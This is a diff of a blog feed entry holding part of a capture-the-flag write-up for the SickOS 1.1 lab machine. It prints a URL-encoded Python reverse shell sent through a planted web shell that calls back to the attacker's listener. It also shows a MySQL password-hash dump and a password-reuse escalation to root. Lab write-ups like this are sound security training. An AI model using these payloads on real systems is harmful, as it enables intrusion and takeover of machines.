+</pre></td><td class='code'><pre><code class=''><span class='line'>%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</span></code></pre></td></tr></table></div></figure></p>
 
 <p>This is how we got the remote shell:
-{% codeblock %}
-root@kali32:~$ nc -l -p 1400</p>
-
-<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30">http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</a>&rdquo;
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1400&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30">http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30&lt;/a>&rdquo;</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>
 
-<p>{% codeblock %}
-www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
-mysql -uroot -pjohn@123 mysql
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A</p>
-
-<p>Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 165
-Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</p>
-
-<p>Copyright &copy; 2000, 2015, Oracle and/or its affiliates. All rights reserved.</p>
-
-<p>Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.</p>
-
-<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>
-
-<p>mysql> SELECT User,Host,Password FROM mysql.user;
-SELECT User,Host,Password FROM mysql.user;
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| User             | Host      | Password                                  |
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| root             | localhost | <em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
-| root             | sickos    | </em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
-| root             | 127.0.0.1 | <em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
-| root             | ::1       | </em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
-| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-5 rows in set (0.00 sec)
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
+</span><span class='line'>mysql -uroot -pjohn@123 mysql
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 165
+</span><span class='line'>Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Copyright &copy; 2000, 2015, Oracle and/or its affiliates. All rights reserved.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql> SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>| User             | Host      | Password                                  |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>| root             | localhost | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | sickos    | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | 127.0.0.1 | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | ::1       | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>5 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>His shell uses the same password and we can easily escalate to uid 0.</p>
 
-<p>{% codeblock %}
-www-data@SickOs:/var/www/wolfcms/public$ su sickos
-su sickos
-Password: john@123</p>
-
-<p>sickos@SickOs:/var/www/wolfcms/public$</p>
-
-<p>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
-sudo -l
-[sudo] password for sickos: john@123</p>
-
-<p>Matching Defaults entries for sickos on this host:
-    env_reset,
-    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-
-<p>User sickos may run the following commands on this host:
-    (ALL : ALL) ALL
-sickos@SickOs:/var/www/wolfcms/public$ sudo su
-sudo su</p>
-
-<p>root@SickOs:/var/www/wolfcms/public# cd /root
-cd /root
-root@SickOs:~# ls -la
-ls -la
-total 40
-drwx&mdash;&mdash;  3 root root 4096 Dec  6 21:14 .
-drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
--rw-r&ndash;r&ndash;  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
--rw&mdash;&mdash;-  1 root root 3724 Dec  6 21:18 .bash_history
--rw-r&ndash;r&ndash;  1 root root 3106 Apr 19  2012 .bashrc
-drwx&mdash;&mdash;  2 root root 4096 Sep 22 08:33 .cache
--rw&mdash;&mdash;-  1 root root   22 Dec  5 06:24 .mysql_history
--rw-r&ndash;r&ndash;  1 root root  140 Apr 19  2012 .profile
--rw&mdash;&mdash;-  1 root root 5230 Dec  6 21:14 .viminfo
-root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
-cat a0216ea4d51874464078c618298b1367.txt
-If you are viewing this!!</p>
-
-<p>ROOT!</p>
-
-<p>You have Succesfully completed SickOS1.1.
-Thanks for Trying
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/var/www/wolfcms/public$ su sickos
+</span><span class='line'>su sickos
+</span><span class='line'>Password: john@123&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>[sudo] password for sickos: john@123&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Matching Defaults entries for sickos on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>User sickos may run the following commands on this host:
+</span><span class='line'>    (ALL : ALL) ALL
+</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo su
+</span><span class='line'>sudo su&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@SickOs:/var/www/wolfcms/public# cd /root
+</span><span class='line'>cd /root
+</span><span class='line'>root@SickOs:~# ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 40
+</span><span class='line'>drwx&mdash;&mdash;  3 root root 4096 Dec  6 21:14 .
+</span><span class='line'>drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root 3724 Dec  6 21:18 .bash_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root 3106 Apr 19  2012 .bashrc
+</span><span class='line'>drwx&mdash;&mdash;  2 root root 4096 Sep 22 08:33 .cache
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root   22 Dec  5 06:24 .mysql_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  140 Apr 19  2012 .profile
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root 5230 Dec  6 21:14 .viminfo
+</span><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>If you are viewing this!!&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>ROOT!&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>You have Succesfully completed SickOS1.1.
+</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:
-{% codeblock %}
-Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Unfortunately our user could not change this permission.</p>
 ]]></content>
